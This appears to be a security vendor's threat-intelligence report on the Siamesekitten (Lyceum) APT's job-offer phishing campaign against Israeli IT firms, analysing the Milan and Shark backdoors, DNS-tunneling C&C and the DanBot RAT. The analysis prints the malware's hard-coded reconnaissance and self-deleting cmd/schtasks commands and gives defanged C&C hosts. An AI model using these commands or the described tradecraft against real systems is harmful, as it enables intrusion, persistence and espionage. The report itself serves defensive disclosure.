Introduction
Executive Summary
At the beginning of May 2021, we detected the first attack by Siamesekitten on an IT company in Israel.
Siamesekitten (also named Lyceum/Hexane) is an Iranian APT group active in the Middle east and in
Africa that is active in launching supply chain attacks. To this end Siamesekitten established a large
infrastructure that enabled them to impersonate the company and their HR personnel. We believe that
this infrastructure was built to lure IT experts and penetrate their computers to gain accesses to the
company’s clients.
In July 2021, we detected a second wave of similar attacks against additional companies in Israel. In
this wave, Siamesekitten upgraded their backdoor malware to a new version called “Shark” and it
replaced the old version of their malware called “Milan”. Details of both versions are included in our
report.
This report summarizes our findings regarding the latest Siamesekitten attacks and reviews the attack
patterns and malware used in this campaign.
We believe that during the past several months Siamesekitten APT has been trying to penetrate into
many Israeli organizations, using supply chain tools.
The attack sequence of Siamesekitten’s attacks that was uncovered by our researchers includes the
following phases:
1. Identifying the potential victim (employee).
2. Identifying the human resources department employee who may be impersonated.
3. Establishing a phishing website that impersonates the targeted organization.
4. Creating lure files compatible with the impersonated organization.
5. Setting up a fraudulent profile on LinkedIn, impersonating the mentioned HR department
employee.
6. Contacting potential victims with an "alluring" job offer, detailing a position in the
impersonated organization
7. Sending the victim to a phishing website with a lure file.
8. The Milan backdoor malware infects the computer or server after one or more lure files are
downloaded. As a result, a connection is established between the infected machine and the
C&C server using DNS and HTTPS.
9. The DanBot RAT is downloaded to the infected system.

10. Through the infected machine, the group gathers data, conducts espionage, and attempts to
spread within the network.
The Iranian attack group Siamesekitten (also named Lyceum/Hexane) has been active since 20181. In
the past, the group has mainly targeted oil, gas, and telecom companies. In 2018, the group primarily
attacked several African countries, and in 2019, they began attacking Middle Eastern 2 countries as
well. In the first quarter of 2021 the group focused on attacks in Tunisia3.
According to research conducted by Dragos researchers, the group establishes a foothold on the
machines they infect to facilitate continued activities on the network. Additionally, Dragos stated that
the group primarily employs lure documents as an initial attack vector. Several security companies
were able to detect a partial resemblance between Siamesekitten’s activities and activities conducted
by two other Iranian groups – APT33 and APT34. After establishing persistence on the infected machine,
the group uses DanBot, a Remote Access Trojan (RAT) that enables downloading and uploading files
from and to the C&C server.
This campaign is similar to the North Korean "job seekers" campaign, employing what has become a
widely used attack vector in recent years - impersonation. Many attack groups are executing this type
of campaign, such as the North Korean Lazarus campaign we exposed in the summer of 2020 (Dream
Job) and the Iranian OilRig campaign (APT34) that targeted Middle Eastern victims in the first quarter
of 2021.
The group offers the potential victim an “alluring” job offer in a known company that they are
impersonating. The victim will be referred to a website hosted on the impersonating server, where they
will find details concerning jobs in Israel, France, and the UK. The website also presents two lure files –
an Excel file that unloads the backdoor using a malicious Macro, and an executable that unloads the
same backdoor onto the machine. After unloading the backdoor, a connection is established between
the infected machine and the C&C server, which will eventually lead to the download of a RAT to the
victim's computer. This dual infection is another development of the group's attack methods.
We believe that these attacks and their focus on IT and communication companies are intended to
facilitate supply chain attacks on their clients. According to our assessment, the group's main goal is
to conduct espionage and utilize the infected network to gain access to their clients’ networks. As
with other groups, it is possible that espionage and intelligence gathering are the first steps toward
executing impersonation attacks targeting ransomware or wiper malware.

Attack Tools
In the Siamesekitten campaign, we discovered several malicious files which the attackers used to gain
initial access to infected computers. The tools and techniques are divided into three categories:
1. Social engineering techniques – Siamesekitten used social engineering techniques to lure the
potential victim into downloading malicious files:
a. Siamesekitten created fake profiles on social networks (mainly LinkedIn).
b.

Siamesekitten created phishing sites impersonating the company that allegedly offers the
alluring jobs.

2. Lure files – Siamesekitten used two types of lure files that do the same thing - download the
group's malware to the machine:
a. Excel file that includes details concerning the various job offers that appeared on the
impersonating website. A malicious, password protected Marco is embedded inside this
excel, designed to download the malware onto the victim's machine.
b. A Portable Executable (PE) file that allegedly includes a 'catalog' of products used by the
impersonated organization. After executing the file, the malware will be downloaded onto
the machine.
3. Attack files and methods of communicating with the C&C server
a. Siamesekitten used a backdoor that was unloaded to the machine after the victim
opened

one of the lure files. Later, the DanBot RAT was downloaded to the machine,

followed by the group's new “Shark” backdoor.
b. The malicious backdoor “Milan” that enables communications between the C&C server
and the infected machine over DNS queries.
c. Communications over DNS Tunneling – communications with the different C&C servers is
conducted using DNS queries. We detected C&C server addresses hard coded to the files.
d. RAT files – the DanBot RAT, used by the group for several years.

Analyzing the Attack
This chapter reviews the group's attack scenario in detail, beginning with initially contacting the victim
through LinkedIn and ending with the final phase of the attack – unloading the RAT onto the victim's
machine. Notably, this is a dual attack scenario, entailing two lure files that accompany the phishing
website.

TTPs
Social Engineering
Approaching the Victim
The victim is contacted through social media. In this instance, the profile is impersonating a manager
from ChipPc’s HR department, an Israeli technology company. Conversing with the company
corroborated that an HR manager with this name was employed in 2007. This indicates that the
attackers thoroughly researched the subject of impersonation to generate a convincing social
engineering array.

When the group contacts the victim, they use a fake profile to offer a significant position in the
company’s IT and technology fields. The victim is then directed to a website that is embedded with
malware and is designed to impersonate the company’s legitimate website.

Impersonating Websites
We estimate that the group is employing a focused social engineering format. We have detected two
prominent websites over the past six months that we associate with this infrastructure:
Softwareagjob[.]com
The company Software AG is a large-scale German technology company. A website impersonating this
company was continuously active during February. Throughout this attack, the group used the fake
website to offer a position in the company.

The impersonating webpage included a link to an XLS lure document that allegedly provides a resume
format:

Pay2Kitten
Jobschippc[.]com
This is the group’s primary website as of the end of May 2021. The website impersonates ChipPc, the
previously mentioned Israeli IT company, and exhibits the group’s new dual attack scenario – using
two lure documents simultaneously.
When the victim visits the website, they arrive at a page detailing three positions in the company: one
position in Rehovot (a city in Israel), concerning project management, HR, and sales, and two
additional positions in France and the United Kingdom (Paris and London respectively) concerning
sales and development. In addition to reading the wording, the victim is requested to download two
files that each refer to a different aspect of the job offer. The first file is an XLS that details the
requirements for each of the offered positions, and the second is an executable that allegedly details
the company’s capabilities in various fields. The files will be elaborated upon below.

The website also seemingly offers a .docx file for download that is named “invitation.docx”, but this
segment is not operational at this point.

When examining the fake website’s file server, it appears that the files were uploaded on May 18th, a
day after they were generated. The website itself was already prepared on May 6th, several days before
it went “live” on May 11th:

Lure Files
XLS File
The Excel file, named “Capabilities.xls”, contains information concerning the different positions and
their requirements. For example:

The Excel file was generated on May 17th, approximately six days after the fake website was created.
The file is embedded with a malicious, password protected macro that provides a layer of defense from
researchers, and its OLE data indicates editors named Fred and Jonathon. We were able to overcome
the encryption and encoding. Once editing is enabled and the malicious macro is executed, a malicious
backdoor named MsNpENg is extracted to several folders with the same name:

As seen in the source code, a scheduled task is generated to establish persistence on the targeted
server. This is the familiar Siamesekitten scenario that they have been employing since 2018.

Executable File
This file is a new addition to the group’s methods. The website contains a password protected ZIP
archive (the password is the domain impersonating the legitimate company) as well as the Excel file.
The archive contains three additional files:
-

An executable named “companycatalog”.

-

A configuration file named “companycatalog.exe.config”.

-

A dynamic library that generates a scheduled task to execute the malware.

Notably, all three files must be extracted to successfully run the malware, as evident from the
executable:

Even though the malware seems like it was written in .NET, a closer inspection reveals that it was
written in C++:

The configuration file’s contents:

The executable allegedly provides details concerning the products ChipPc specializes in, emphasizing
three primary products: Citrix, Microsoft, and VMware. A link leading to the product’s legitimate
developer is added alongside the provided details:

When executing the aforementioned file, while extracting the rest of the archived files, the backdoor is
extracted again. This time, the backdoor is extracted with the name “ChipPc.exe”, though it still uses
the COM component to generate a scheduled task.

Milan Backdoor
Malware Analysis
Despite the previously presented names (ChipPc for example) the original file was named Milan.exe, as
can be seen in the file’s properties:

This may also be learned from the malware’s PDB path:
C:\Users\kernel\Desktop\milan\Release\Milan.pdb
The malware’s Debugger Stamp date is May 18th, indicating that the malware was newly created a day
after the Excel file:

The malware executes several CMD commands that are hard coded to the malware's source code:
-

C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2>&1

-

C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2>&1

-

C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q "%s" & schtasks

& copy "%s" "%s" & schtasks /Run /TN "SystemTask"

As mentioned previously, when one of the lure documents is executed, a folder is generated in
“Program Data” containing the malware. Another folder named “log” is generated in this folder,
alongside a text file named “current” and files with the suffix MDF (disk).
The text file contains a short string – “config:1251”. After the malware is executed, this file will be
deleted. The malware gathers information concerning the machine, such as the machine’s name, what
users are registered on it, and more. The contents are encoded and saved in files with the suffix MDF.

In accordance with Siamesekitten’s familiar attack scenario, folders meant to receive or upload files
are generated in the “log” folder. Each folder’s name begins with the character sequence
“a9850d2f”and ends with a single different character that signifies the folder’s function. For example,
the folder named “a9850d2fd” is used to receive files sent from the C&C server through DNS Tunneling.
The letters d, f, g, and s are used to differentiate the folders:

The servers the malware contacts are hard coded to its code:

Communication with the Server
Communications are performed using two methods. Initially, HTTP requests are sent to the C&C
domain to download a malicious payload. The requests are sent with a pre-defined user agent:

The requests’ contents are the following:
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/89.0.4389.114 Safari/537.36
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media
Center PC 4.0; .NET CLR 2.0.50727)

The C&C server contacted by the malware was previously used by other Iranian attack groups, such as
APT39:

Following this, the malware attempts to send DNS queries. If the queries are successful, they are
directed to C&C servers operated by the group. In the following example, communications over DNS
were successful, and were directed to C&C servers situated in Russia, the Ukraine, or Nigeria as a result.
These are apparently either compromised servers used by the group or VPN\VPS servers.

If the communications fail, the digit “0” is returned in response. If they are successful, a signal
containing four characters alongside some additional content is returned in response.

After eight characters, a .bin suffix is received as a signal:

The responses are eventually united to a single payload – f5cf9869.bin. This file is saved in the relevant
folder (specified by the letter “d”):
C:\ProgramData\MsNpENg\Log\a9850d2fd\f5cf9869.bin
Alternatively, the server may respond with complete words, such as “yes”:

It appears that communications are directed at several different C&C servers, specifically
defenderlive[.]com and dnsstatus[.]org in the following instance:

Shark Backdoor
Malware Analysis
In July 2021, indicators associated with this attack were shared with us by colleague researchers.
Through cross-referencing findings from the campaign, we identified this malware as a substitute for
DanBot. According to one of the files’ PDB path, the malware is named “Shark”, a name we adopted
(like in Milan’s case):
C:\Projects\Shark\Shark\obj\Debug\Shark.pdb
In addition, we were able to detect other PDB paths containing the name” Shark”, but the file name
was changed to appear more legitimate. Here are the two additional paths:
D:\source\repos\Shark\Shark\obj\Release\audioddg.pdb
C:\Users\David\Desktop\sharkkkkkk\Shark\obj\Release\Winlangdb.pdb
Unlike the Milan malware, these files were written in .NET instead of C ++. The malware requires the
use of a parameter that contains part of the executed file’s name. The malware will generate a Mutex
with the file’s name as its value to make sure that the malware does not run on the infected machine
more than once. Executing the malware is also conditioned by the screen width being more than 600
pixels.

Next, the malware will activate a function called ‘redus’. This function produces an encrypted G-ZIP file
with a preset configuration which is encoded within the malware. This configuration file contains two
C&C servers and various malware functions, which will be detailed below.
The following is the relevant code snippet:

The configuration file will be encoded using a 0x2a XOR key. The malware will generate four folders
according to the relevant functions named ‘D1’, ‘U1’, ‘D2’ and ‘U2’ - like the folders created when the
Milan backdoor is installed. Random numbers between 0 and 1,000,000 will be added before and after
the predefined folder names.

The following is an analysis of the parameters we detected in the configuration:
Field

Purpose

S1

S2

C&C server 2

T1

DNS traffic pause intervals

T2

HTTP traffic pause intervals

D1

Determines the path that will store files downloaded through DNS
communication

D2

Determines the path that will store files downloaded through
HTTP communication

U1

Determines the path that will store files to be uploaded to the C&C
through DNS communication

U2

Determines the path that will store files to be uploaded to the C&C
through HTTP communication

ID

Defines a unique identifier for the infected machine

SH

If empty - receive information via DNS queries
If not empty - send information through HTTP requests

HS

If 0 - send information through DNS queries
If 1 - receive information via HTTP requests

Di / Hi

Unknown (apparently, these are communication parameters)

To establish a foothold on the machine, the malware will save the infected machine’s GUID and paste
it into the configuration ID. In addition, the machine creates four main functions that indicate
communications with the C&C server (over HTTP and DNS). DNS communications are sent using a
unique Domain Generation Algorithm. Alongside another function called ‘E’, the functions run as an
infinite thread, allowing the malware to continue running as long as the machine is turned on.
The five distinct functions are ‘HT’, ‘HT_SEND’, ‘DN’, ‘DN_SEND’, and ‘E’.
The E function is responsible for managing files in the D1 and D2 folders. These folders contain data
downloaded to the infected machine from the C&C server. The malware initially searches for ZIP files,
saving their content to the memory and deleting the files.
If the file’s suffix is TMP.ZIP, it is assumed to contain commands and is extracted and decrypted using
the Reject function, like the configuration file. The results of executing the commands will be stored in
the folders U1 or U2 to be uploaded to the C&C, matching the D1 or D2 folders in which they originated.
Notably, some of the commands require CMD to activate. The malware constructs CMD commands
from the file downloaded from the C&C and transfers them to a file named dmp.bat. The malware
then searches for dmp.bat and attempts to execute it through CMD.
The following is a processing of the ‘Reject’ function:

Communication with the Server
DN function: this function is responsible for downloading information from the C&C using DNS
Tunneling. The function generates unique subdomains and resolves them to send or receive
information. The function responsible for generating the domains is the d-gen function, which receives
four different parameters:
1. D (data) - the requested information.
2. Id - the message’s identifier.
3. Op - the type of information.
4. D2 - the information meant to be sent.
The following is the relevant code snippet:

The DN function can process several different types of information which will be sent to the server or
downloaded from it. The following is a list of the various OP IDs:

OP ID

Purpose

I

Detects the current C&C’s address using the subdomain unique to the machine
and saves it to the Sh field

O

Checks whether the C&C’s IP address has changed. If it was, the Sh field is reset

k

Requests a file from the C&C server

t

As long as this file is received, the malware has not finished downloading the file
from the C&C server

s

Receiving this flag indicates that the file download has finished

x

Delete the original downloaded file in case the download failed

The DN_SEND function is activated once the DN function concludes its activity. Like the DN function,
DN_SEND is responsible for sending information through DNS using d_gen.
This function has 2 additional OP identifiers:
OP ID

Meaning

j

Prepares the C&C server to receive information

n

This flag is sent while sending information to the C&C. The replies received from
the server determine whether to continue sending information or to delete the
sent file (in case it was successfully sent or was failed to be sent)

The sub-domain created for communications with the C&C server contains the following parameters
which will be encoded to hex accordingly:
<ID> <OP> <Time in Seconds> <Data> <Random> .c2.tld

HT function: like the DN function, the various HT functions are also responsible for communications
with the C&C server over the HTTPS protocol. The ‘HT’ function in the malware is responsible for
downloading information from the C&C server. Like the ‘DN’ function, various OP parameters will be

The ‘HT_Send’ function is responsible for sending information to the command-and-control server.
The information will be stored in the ‘U2’ folder which will contain encoded ZIP files. The file and its
information will be sent to the C&C using a POST request. After it is sent, the file is deleted.

DanBot RAT
In a campaign we detected during May-June, we identified a file uploaded to Virus Total that originated
in Tunisia and included two versions of the DanBot malware the group has been using for a long time.
The first file was named ‘UltraVNC.exe’ and the second file was named ‘WINVNC.exe’. These two files
are two versions of a remote control (fundamentally legitimate) technique called Virtual Network
Computing, a remote access software which has been converted to RAT (trojan).
The first version is the UltraVNC tool that may be downloaded from the following site:
uvnc.com/
The second version is the WinVNC tool which is an NT VNC Server that may be downloaded from the
following site:
Umsl[.]edu/~eckerta/vnc_docs/winvnc.html#:~:text=WinVNC%20is%20a%20VNC%20server,desktop
%20from%20any%20VNC%20viewer.&text=It%20is% 20only% 20fair% 20to, software% 2C% 20for%
20example% 2C% 20does

These files allow the attacker to remotely access the victim’s desktop. However, it is only possible to
establish a connection when no one is using the system. The tool allows for remote control of another
computer's screen, including controlling the mouse and keyboard, internet access, transferring files
and managing the computer.
According to the PDB path it can be seen similarities between this file and other group files:
C:\Users\kernel\Desktop\final20201202\Files\BackDor Last\Release\WINVNC.pdb
The file was generated in 2020. This may be learned from the folder’s name: ‘Final-2020-01-20’.
However, the signature for these files is Copyright 2019 (apparently a fake figure) while the compilation
time is June 9th, 2021. The file appears to be an advanced version of the group's previous tools but was
recently created in its current format and implemented after the start of the ChipPc campaign.
The compilation time:

The following are the file’s properties:

Like the backdoor, both types of this VNC file unload a TXT file containing configuration data (config:
1251) that will be deleted after the file is installed, like in Milan’s case. Another similarity we found is in
the CMD commands used by the group, presented above, as well as the User Agent embedded in the
file. Two of the group’s new C&C servers are embedded in the files.

Attack Infrastructure
The attack infrastructure includes fake websites and C&C servers capable of processing both HTTP
requests and DNS queries. The lure websites’ infrastructure is completely different to the C&C servers’
infrastructure. In resemblance to past attacks conducted by the group, the C&C server infrastructure
impersonates IT services such as a DNS-checking website named DNS-status, or various anti-virus
services, such as Defender-Live.
Utilizing our past familiarity with these methods, we were able to identify C&C servers with the address
185.243.112[.]120 and 23.94.22[.]145. As of May, two new domains were registered by the group. Please
note the domain ending with .ru is not part of this array:
